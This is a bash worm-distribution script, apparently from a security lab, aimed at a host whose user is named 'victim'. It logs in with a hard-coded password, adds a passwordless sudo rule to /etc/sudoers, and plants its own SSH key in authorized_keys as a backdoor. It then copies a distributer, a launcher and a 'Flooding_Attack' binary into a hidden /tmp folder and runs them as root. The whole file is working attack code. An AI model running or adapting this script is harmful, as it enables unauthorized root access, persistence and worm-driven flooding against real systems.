#!/bin/bash

destip=$1
isFirst=$2

require_ssh_key_generated() {
    if [ ! -f ~/.ssh/id_rsa ]; then
        echo "Generating SSH keys ..."
        mkdir -p ~/.ssh
        ssh-keygen -t rsa -N "" -f ~/.ssh/id_rsa
    fi
}

require_nopasswd(){
    local superprv="victim ALL=(ALL) NOPASSWD: ALL"
    local dest="/etc/sudoers"
    local execmdd="grep victim $dest || echo \"Writing sudoers ...\" && echo \"$superprv\" >> $dest"
    local cmdd="echo victim | sudo -S bash -c '$execmdd'"
    echo $cmdd
    sshpass -p victim ssh -o StrictHostKeyChecking=No $destip -l victim $cmdd
}

require_ssh_key_set() {
    local mykey=$(cat ~/.ssh/id_rsa.pub)
    local dest="~/.ssh/authorized_keys"
    local cmdd="mkdir -p ~/.ssh; touch $dest; grep \"$mykey\" $dest &> /dev/null || \
                echo 'Setting SSH for the first time ...' && echo \"$mykey\" >> $dest"
    sshpass -p victim ssh -o StrictHostKeyChecking=No $destip -l victim $cmdd
}

require_worm_distributed() {
    local tmpdest="/tmp/.worm0716023"
    local pvkeyloc=~/.ssh/id_rsa
    echo "Dsitributing worms ..."
    ssh -i $pvkeyloc victim@$destip "rm -rf $tmpdest && mkdir $tmpdest"
    scp -i $pvkeyloc ./task_ii/distributer.sh ./task_ii/Flooding_Attack ./task_ii/launcher.sh victim@$destip:$tmpdest
    echo "Launching worms ..."
    ssh -i $pvkeyloc -t victim@$destip "chmod +x $tmpdest/distributer.sh && sudo $tmpdest/distributer.sh"
}

if [ -n $isFirst ]; then
    echo "This is the first time ..."
    reqruire_ssh_key_generated
    require_nopasswd
    require_ssh_key_set
fi
require_worm_distributed
echo "All task done"
